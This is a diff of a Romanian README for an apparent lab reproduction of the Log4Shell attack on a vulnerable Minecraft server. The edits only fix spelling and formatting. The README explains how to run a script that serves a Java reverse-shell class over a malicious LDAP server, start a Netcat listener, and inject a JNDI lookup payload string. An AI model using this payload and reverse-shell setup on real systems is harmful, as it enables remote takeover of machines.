@@ -12,7 +12,7 @@ Proiectul este capabil sa initieze o conexiune de tip reverse shell.
 
 Proiectul este construit sa functioneze pe un sistem Kali Linux. Acesta are deja instalate urmatoarele programe necesare: Python3, Netcat, Git.
 
-Pentru a instala Kali accesati [pagina oficiala](https://www.kali.org/docs/installation/hard-disk-install/) a sofwareului.
+Pentru a instala Kali accesati [pagina oficiala](https://www.kali.org/docs/installation/hard-disk-install/) a softwareului.
 
 In reproducerea atacului am folosit [Virtualbox](https://www.virtualbox.org/wiki/Downloads) pentru a virtualiza masina de Kali Linux. [Tutorial](https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/) 
 
@@ -26,9 +26,9 @@ Pentru versiunea Minecraft vulnerabila se recomanda descarcarea de pe [acest lin
 
 ## Executarea exploitului
 
-Dupa ce se cloneza acest repository, se intra in folderul lui.
+* Dupa ce se cloneza acest repository, se intra in folderul lui.
 
-Urmatoarea caseta explica cum trebuie executat scripul de Python:
+* Urmatoarea caseta explica cum trebuie executat scripul de Python:
 ```
 usage: application.py [-h] [--ip IP] [--port PORT]
                       [--nume_clasa NUME_CLASA]
@@ -42,17 +42,17 @@ optional arguments:
   --port PORT           Portul Netcat
   --nume_clasa NUME_CLASA Clasa java
 ```
-<IP> - Ip-ul masinii atacate
-<Port> - Portul unde este acultata conexiunea reverse shell (ex:9999)
-<Nume> - Numele dorit pentru clasa java reverse shell generata
+<\IP> - Ip-ul masinii atacate
+<\Port> - Portul unde este acultata conexiunea reverse shell (ex:9999)
+<\Nume> - Numele dorit pentru clasa java reverse shell generata
 
-Dupa rulare, va exista un server malitios valabil pentru a injecta clasa java ce initiaza o conexiune reverse shell.
+* Dupa rulare, va exista un server malitios valabil pentru a injecta clasa java ce initiaza o conexiune reverse shell.
 
-Observatii!
+### Observatii!
 
 Scriptul este configurat pentru a ataca o masina Windows. Pentru atacul unei masini Linux trebuie schimbat in script programul Java. Se cauta in fisier "cmd.exe" si se inlocuieste cu "/bin/bash".
 
-Netcat
+* Netcat
 
 Pornirea unei instante separate netcat. Asculta pentru o conexiune reverse shell.
 ```
@@ -63,7 +63,7 @@ Aici va fi gasita linia de comanda a sistemului atacata
 
 ## Injectare si rezultate
 
-In consola, unde scriptul python ruleaza, se va afisa comanda necesara ce trebuie introdusa in sistemul vulnerabil. Cum ar trebuii sa arate comanda: ```${{jndi:ldap://{args.ip}:1389/{args.nume_clasa}}```
+In consola, unde scriptul python ruleaza, se va afisa comanda necesara ce trebuie introdusa in sistemul vulnerabil. Cum ar trebuii sa arate comanda: `${{jndi:ldap://{args.ip}:1389/{args.nume_clasa}}`
 
 Pentru serverul de Minecraft trebuie sa ne conectam cu un client. Dupa conexiunea la sever a clientului se introduce comanda anterioara.
 
